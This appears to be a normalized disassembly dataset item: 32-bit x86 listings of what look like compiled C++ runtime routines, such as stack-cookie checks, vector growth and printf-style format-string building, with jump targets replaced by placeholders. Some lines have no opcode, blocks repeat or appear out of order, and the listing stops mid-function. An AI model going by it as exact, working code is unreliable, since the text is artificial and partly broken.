cmp [ esp + 0x14 ] edx
jae r-xdata
sub ebx esi
fmul st1
add [ esp + 0x14 ] esi
jmp r-xdata
sub_1000524c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
push [ ebp + 0xc ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10011a63
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x20 ]
push esi
push ebx
mov ecx edi
call sub_10005e08
mov ecx [ esp + 0x6c ]
add esp 0x18
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x18
sub_1000530f
cmp esi 0xffffffff
jne r-xdata
push 0x0
push esi
mov ecx edi
call sub_10001cc3
test al al
je r-xdata
call sub_1000f9c4
mov eax edi
retn 0x4
mov dl [ esp + 0x4 ]
push esi
xor ecx ecx
mov eax edi
call sub_10005342
push esi
mov ecx edi
call sub_10001ca7
sub_10005342
cmp [ esp + 0x4 ] 0x1
jne r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push [ esp + 0x4 ]
movsx edx dl
push edx
add eax ecx
push eax
call sub_10011a90
add esp 0xc
retn 0x4
mov [ eax + ecx ] dl
jmp r-xdata
sub_10005380
push 0x0
mov eax sub_10027b5d
call sub_10014213
mov edi ecx
call sub_10007f07
mov eax [ ebp + 0x8 ]
mov [ edi + 0x28 ] eax
xor ebx ebx
lea esi [ ebp + 0x8 ]
mov eax edi
mov [ edi + 0x2c ] ebx
call sub_10008382
push eax
mov [ ebp - 0x4 ] ebx
call sub_10007e3d
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_100086e3
mov eax [ esi ]
push 0x20
mov ecx esi
call [ eax + 0x18 ]
mov [ edi + 0x30 ] al
cmp [ edi + 0x28 ] ebx
jne r-xdata
mov [ edi + 0x4 ] ebx
call sub_100142eb
retn 0x4
mov eax [ edi + 0x8 ]
or eax 0x4
push ebx
push edi
mov ecx eax
call sub_100084c5
sub_100053eb
push 0x0
mov eax sub_10026b5e
call sub_10014213
mov edi [ ebp + 0x8 ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_1000fefd
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_10010c96
pop ecx
test eax eax
je r-xdata
xor eax eax
mov esi eax
call sub_10008723
jmp r-xdata
mov [ edi + 0x38 ] eax
mov eax edi
call sub_10005446
mov eax edi
call sub_100142eb
retn 0x4
sub_10005446
lea edx [ eax + 0x18 ]
mov [ eax + 0x20 ] edx
lea edx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
lea edx [ eax + 0x28 ]
mov [ eax + 0x30 ] edx
lea ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
lea edx [ eax + 0x2c ]
mov [ eax + 0x34 ] edx
xor edx edx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] ecx
mov [ ecx ] edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ eax + 0x10 ]
mov [ ecx ] edx
mov ecx [ eax + 0x20 ]
mov [ ecx ] edx
mov eax [ eax + 0x30 ]
mov [ eax ] edx
retn
sub_10005488
push 0x4
mov eax sub_10027f6e
call sub_10014213
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebx + eax ] r--data
mov eax [ ebx ]
mov [ ebx + 0x4 ] esi
mov edi [ eax + 0x4 ]
add edi ebx
call sub_10007f07
mov eax [ ebp + 0xc ]
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] esi
lea esi [ ebp + 0xc ]
mov eax edi
call sub_10008382
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100079e4
pop ecx
lea ecx [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x4 ] 0x0
call sub_100086e3
mov eax [ esi ]
push 0x20
mov ecx esi
call [ eax + 0x28 ]
xor esi esi
mov [ edi + 0x30 ] ax
cmp [ edi + 0x28 ] esi
jne r-xdata
mov [ edi + 0x4 ] esi
mov eax ebx
call sub_100142eb
retn 0x8
mov eax [ edi + 0x8 ]
or eax 0x4
push esi
push edi
mov ecx eax
call sub_100084c5
sub_10005516
push 0x0
mov eax sub_10026b5e
call sub_10014213
mov edi [ ebp + 0x8 ]
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_1000fefd
xor ebx ebx
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_10010c96
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov esi eax
call sub_10008723
jmp r-xdata
mov [ edi + 0x38 ] eax
lea ecx [ edi + 0x18 ]
mov [ edi + 0x20 ] ecx
lea ecx [ edi + 0x1c ]
mov [ edi + 0x24 ] ecx
lea eax [ edi + 0x8 ]
mov [ edi + 0x10 ] eax
lea ecx [ edi + 0x28 ]
mov [ edi + 0x30 ] ecx
lea eax [ edi + 0xc ]
mov [ edi + 0x14 ] eax
lea ecx [ edi + 0x2c ]
mov [ edi + 0x34 ] ecx
mov [ eax ] ebx
mov eax [ edi + 0x24 ]
mov [ eax ] ebx
mov eax [ edi + 0x34 ]
mov [ eax ] ebx
mov eax [ edi + 0x10 ]
mov [ eax ] ebx
mov eax [ edi + 0x20 ]
mov [ eax ] ebx
mov eax [ edi + 0x30 ]
mov [ eax ] ebx
mov eax edi
call sub_100142eb
retn 0x4
sub_100055bf
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
mov eax [ esi + 0x4 ]
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10010b92
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10010b92
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_1000560c
push 0x18
mov eax sub_100270f4
call sub_10014246
mov esi ecx
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0xc ]
test edx edx
jne r-xdata
mov eax [ edi + 0x14 ]
sub eax edx
sar eax 0x3
mov [ ebp - 0x18 ] eax
and [ ebp - 0x18 ] edx
jmp r-xdata
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x18 ]
cmp eax ebx
jae r-xdata
call sub_1000585e
mov ecx [ edi + 0x10 ]
mov eax ecx
sub eax edx
mov edx 0x1fffffff
sar eax 0x3
mov ebx edx
sub ebx eax
cmp ebx 0x1
jae r-xdata
sub ecx [ ebp + 0x10 ]
mov eax [ esi ]
sar ecx 0x3
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x20 ] eax
cmp ecx 0x1
jae r-xdata
shr eax 0x1
sub edx eax
cmp edx [ ebp - 0x18 ]
jae r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
add [ ebp - 0x18 ] eax
and [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_10006cc8
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_10006cc8
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
xor esi esi
sar eax 0x3
inc esi
sub esi eax
call sub_100048be
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov ecx [ ebp - 0x18 ]
call sub_1000589d
mov ecx [ ebp + 0x10 ]
sub ecx [ edi + 0xc ]
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
sar ecx 0x3
xor esi esi
lea ebx [ eax + ecx * 8 ]
inc esi
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ecx
call sub_100048be
mov ebx [ ebp - 0x1c ]
mov ecx [ edi + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ ebp + 0x8 ] esi
call sub_10006cc8
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea eax [ ebx + eax * 8 + 0x8 ]
push eax
push [ edi + 0x10 ]
mov [ ebp + 0x8 ] 0x2
call sub_10006cc8
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi + 0x10 ]
mov eax [ edi + 0xc ]
mov esi ecx
sub esi eax
sar esi 0x3
inc esi
test eax eax
je r-xdata
mov [ ebp - 0x18 ] ebx
cmp [ ebp - 0x18 ] ebx
jae r-xdata
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ ebx + eax * 8 ]
mov [ edi + 0x14 ] eax
lea eax [ ebx + esi * 8 ]
mov [ edi + 0x10 ] eax
mov [ edi + 0xc ] ebx
jmp r-xdata
push ecx
call sub_100055f2
push [ edi + 0xc ]
call sub_10010ba2
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
call sub_1000863f
lea eax [ ebp - 0x24 ]
call sub_1000c246
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_1000c246
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_1000c246
add esi 0x8
jmp r-xdata
call sub_100142eb
retn 0xc
sub_1000570c
cmp [ ebp + 0x8 ] 0x1
mov esi [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
jle r-xdata
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jle r-xdata
lea eax [ esi + edi * 8 ]
push eax
mov eax esi
call sub_100055f2
push esi
call sub_10010ba2
pop ecx
push ebx
push ebx
call sub_10013de1
sub ecx [ ebp + 0x10 ]
mov eax [ esi ]
sar ecx 0x3
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x20 ] eax
cmp ecx 0x1
jae r-xdata
lea eax [ esi + edi * 8 + 0x8 ]
push eax
lea eax [ esi + edi * 8 ]
call sub_100055f2
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x5
mov esi [ edi + 0x10 ]
push esi
lea ebx [ esi - 0x8 ]
push esi
mov ecx ebx
call sub_10006cc8
mov [ edi + 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
cmp eax ebx
je r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x8 ]
push eax
push [ edi + 0x10 ]
call sub_10006cc8
mov [ ebp - 0x4 ] 0x3
mov ebx [ edi + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax ebx
sub eax [ ebp + 0x10 ]
xor esi esi
sar eax 0x3
inc esi
sub esi eax
call sub_100048be
mov [ ebp - 0x4 ] 0x2
add [ edi + 0x10 ] 0x8
mov edi [ edi + 0x10 ]
mov esi [ ebp + 0x10 ]
add edi 0xfffffff8
jmp r-xdata
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
lea edi [ eax + 0x8 ]
mov esi eax
cmp eax edi
je r-xdata
mov edi esi
sub edi ebx
cmp esi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
call sub_1000863f
call sub_100142eb
retn 0xc
lea eax [ ebp - 0x24 ]
call sub_1000c246
add esi 0x8
cmp esi edi
jne r-xdata
sub ebx 0x8
lea esi [ edi + ebx ]
mov eax ebx
call sub_1000c246
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
call sub_1000c246
add esi 0x8
jmp r-xdata
sub_1000585e
push 0x44
mov eax sub_10026d8e
call sub_10014213
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001066
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_10013de1
int3
sub_1000589d
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x8
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x3
push eax
call sub_10010c96
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10010806
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10013de1
int3
sub_100058e9
push ebx
mov ebx ecx
mov [ esi ] 0x25
lea ecx [ esi + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov [ ecx ] 0x2e
inc ecx
mov [ ecx ] 0x2a
inc ecx
test al al
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] al
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
mov eax esi
pop ebx
retn
sub_10005945
push 0x70
mov eax sub_100270bf
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x54 ] eax
mov edi edx
lea esi [ ebp - 0x78 ]
mov eax ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] edi
call sub_10008382
and [ ebp - 0x4 ] 0x0
push eax
call sub_10006c2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov esi eax
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] esi
call sub_100086e3
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10006363
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
movzx eax ax
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x14 ] 0xf
call sub_10001ca7
mov eax [ ebp - 0x54 ]
add eax 0x8
push eax
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_10007edb
movzx eax ax
mov [ ebp - 0x5c ] eax
mov al [ edi ]
pop ecx
pop ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x68 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
and [ ebp + 0x1c ] eax
and [ ebp - 0x68 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
call sub_10011b0a
mov eax [ eax ]
push [ ebp + 0x20 ]
mov al [ eax ]
push 0x65
push edi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] 0x0
call sub_10011b30
add esp 0xc
push [ ebp + 0x20 ]
mov esi eax
movsx eax [ ebp - 0x50 ]
push eax
push edi
call sub_10011b30
add esp 0xc
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
add eax ecx
add eax [ ebp + 0x1c ]
mov ecx [ ebx + 0x18 ]
add eax [ ebp + 0x20 ]
test ecx ecx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
and [ ebp - 0x4c ] 0x0
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x20 ]
push eax
push edi
call sub_10011b30
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x2c ]
push edi
call sub_100060ef
test esi esi
jne r-xdata
push [ ebp + 0x20 ]
push 0x65
push edi
call sub_10011b30
add esp 0xc
test eax eax
je r-xdata
push [ ebp + 0x28 ]
sub eax edi
push [ ebp + 0x24 ]
inc eax
push [ ebp - 0x6c ]
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x54 ]
mov eax edi
call sub_100062d7
mov ecx [ eax ]
push [ ebp + 0x14 ]
mov [ ebp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
push [ ebp - 0x5c ]
mov [ ebp + 0x28 ] ecx
push [ eax + 0x4 ]
lea esi [ ebp - 0x64 ]
push [ eax ]
call sub_10005fe5
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x70 ]
mov [ ebp + 0x28 ] eax
mov eax [ ecx ]
add esp 0x28
call [ eax + 0x4 ]
movzx eax ax
push 0x1
push eax
push [ ebp + 0x28 ]
lea esi [ ebp - 0x74 ]
push [ ebp + 0x24 ]
call sub_10005fe5
mov ecx [ eax ]
push [ ebp + 0x18 ]
mov [ ebp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
push [ ebp - 0x5c ]
mov [ ebp + 0x28 ] ecx
push [ eax + 0x4 ]
lea esi [ ebp - 0x74 ]
push [ eax ]
call sub_10005fe5
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
add edi ebx
add esp 0x20
sub [ ebp + 0x20 ] ebx
mov ebx [ ebp - 0x58 ]
mov [ ebp + 0x28 ] eax
push [ ebp - 0x4c ]
lea esi [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
call sub_10005fe5
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x28 ] eax
cmp [ ebp - 0x68 ] 0x0
jbe r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov ebx [ ebp + 0x1c ]
push 0x30
lea edi [ ebp - 0x2c ]
call sub_100047d5
jmp r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x24 ]
push [ ebp - 0x6c ]
push [ ebp + 0x20 ]
push eax
push [ ebp - 0x54 ]
mov eax edi
call sub_100062d7
mov ecx [ eax ]
push [ ebp + 0x1c ]
mov [ ebp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
push [ ebp - 0x5c ]
mov [ ebp + 0x28 ] ecx
push [ eax + 0x4 ]
lea esi [ ebp - 0x64 ]
push [ eax ]
call sub_10005fe5
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
push eax
xor edi edi
push ecx
mov [ ebp + 0x28 ] eax
mov [ ebx + 0x18 ] edi
call sub_10005fe5
add esp 0x38
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000197b
mov eax esi
call sub_100142ff
retn
push [ ebp + 0x28 ]
sub eax edi
push [ ebp + 0x24 ]
inc eax
push [ ebp - 0x6c ]
mov [ ebp - 0x70 ] eax
dec eax
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ ebp - 0x54 ]
mov eax edi
call sub_100062d7
mov ecx [ eax ]
push [ ebp + 0x1c ]
mov [ ebp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
push [ ebp - 0x5c ]
mov [ ebp + 0x28 ] ecx
push [ eax + 0x4 ]
lea esi [ ebp - 0x7c ]
push [ eax ]
call sub_10005fe5
mov ecx [ eax ]
and [ ebp + 0x1c ] 0x0
mov [ ebp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x28
test [ ebx + 0x10 ] 0x4
mov [ ebp + 0x28 ] ecx
mov ecx r--data
jne r-xdata
mov ecx [ ebp - 0x54 ]
push 0x1
push [ ebp + 0x28 ]
mov eax edi
push [ ebp + 0x24 ]
lea ebx [ ebp - 0x64 ]
call sub_10006281
mov ecx [ eax ]
mov ebx [ ebp - 0x58 ]
add esp 0xc
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
inc edi
dec [ ebp + 0x20 ]
mov [ ebp + 0x28 ] eax
push 0x30
push [ ebp + 0x1c ]
mov edi esi
sub edi [ ebp - 0x4c ]
lea esi [ ebp - 0x2c ]
call sub_10006189
mov ebx [ ebp + 0x14 ]
push 0x30
lea edi [ ebp - 0x2c ]
call sub_100047d5
and [ ebp + 0x14 ] 0x0
mov ebx [ ebp - 0x60 ]
push 0x30
test ebx ebx
jne r-xdata
push 0x1
push [ eax + 0x4 ]
lea ebx [ ebp - 0x7c ]
push [ eax ]
mov eax ecx
mov ecx [ ebp - 0x54 ]
call sub_10006281
mov ecx [ eax ]
mov ebx [ ebp - 0x58 ]
mov [ ebp + 0x24 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x28 ] eax
mov eax [ ebp - 0x70 ]
add esp 0xc
add edi eax
sub [ ebp + 0x20 ] eax
mov ecx r--data
sub ebx [ ebp - 0x4c ]
push [ ebp + 0x18 ]
lea edi [ ebx + 0x1 ]
lea esi [ ebp - 0x2c ]
call sub_10006189
push 0x30
push [ ebp + 0x14 ]
mov edi ebx
call sub_10006189
and [ ebp + 0x18 ] 0x0
mov ebx [ ebp + 0x14 ]
lea edi [ ebp - 0x2c ]
call sub_100047d5
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000621c
push eax
call sub_10011be0
pop ecx
pop ecx
mov edi eax
jmp r-xdata
lea ebx [ ebp - 0x44 ]
and [ ebp + 0x14 ] 0x0
cmp [ ebp - 0x30 ] 0x10
mov ebx [ ebp - 0x44 ]
jae r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000621c
and [ ebp + 0x1c ] 0x0
mov ebx [ ebp - 0x58 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x4c ]
mov [ ebp + 0x20 ] eax
mov ecx edi
sub ecx [ ebp - 0x68 ]
movsx eax al
cmp eax ecx
jae r-xdata
push 0x0
sub edi eax
push 0x1
lea esi [ ebp - 0x2c ]
call sub_10006189
lea eax [ ebx + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov ebx eax
sub_10005da3
mov [ edi ] 0x25
lea ecx [ edi + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov al [ ebx ]
cmp al 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] al
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
push esi
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ ebx + 0x1 ]
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
mov eax edi
pop esi
retn
sub_10005e08
push 0x44
mov eax sub_10026cc6
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov [ ebp - 0x44 ] eax
lea esi [ ebp - 0x50 ]
mov eax ebx
mov [ ebp - 0x48 ] ebx
mov edi edx
call sub_10008382
and [ ebp - 0x4 ] 0x0
push eax
call sub_10006c2c
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ecx esi
mov [ ebp - 0x40 ] eax
call sub_100086e3
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10006363
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov al [ edi ]
cmp al 0x2b
je r-xdata
mov [ ebp - 0x30 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov esi [ ebx + 0x18 ]
test esi esi
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x30 ] 0x0
jmp r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
cmp esi [ ebp + 0x14 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push [ ebp + 0x1c ]
movzx eax ax
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x44 ]
mov eax edi
call sub_100062d7
mov ecx [ eax ]
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov [ ebp + 0x18 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
mov [ ebp + 0x1c ] eax
call sub_10005fe5
add esp 0x28
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax esi
call sub_100142ff
retn
cmp eax 0x100
je r-xdata
sub esi [ ebp + 0x14 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x44 ]
push [ ebp + 0x1c ]
mov eax edi
push [ ebp + 0x18 ]
lea ebx [ ebp - 0x3c ]
call sub_10006281
mov ecx [ eax ]
add esp 0xc
mov [ ebp + 0x18 ] ecx
mov ecx [ eax + 0x4 ]
push esi
push [ ebp + 0x10 ]
mov [ ebp + 0x1c ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x30 ]
push [ eax ]
sub [ ebp + 0x14 ] ecx
lea esi [ ebp - 0x34 ]
add edi ecx
call sub_10005fe5
mov ebx [ ebp - 0x48 ]
push esi
push [ ebp + 0x10 ]
lea esi [ ebp - 0x4c ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_10005fe5
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x38 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x18 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
xor esi esi
mov [ ebp + 0x1c ] eax
mov eax [ ebp - 0x38 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov esi [ ebp + 0x14 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ ebp - 0x30 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ ebp + 0x14 ]
sub eax esi
inc eax
push eax
lea ebx [ edi + esi ]
push ebx
push eax
lea eax [ edi + esi + 0x1 ]
push eax
call sub_10010798
mov eax [ ebp - 0x38 ]
add esp 0x10
inc [ ebp + 0x14 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
sub_10005fe5
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] 0x1
mov edx [ ebp + 0x10 ]
call sub_10007a82
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp + 0x14 ]
jne r-xdata
sub_1000604d
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10011c26
push [ esi + 0x10 ]
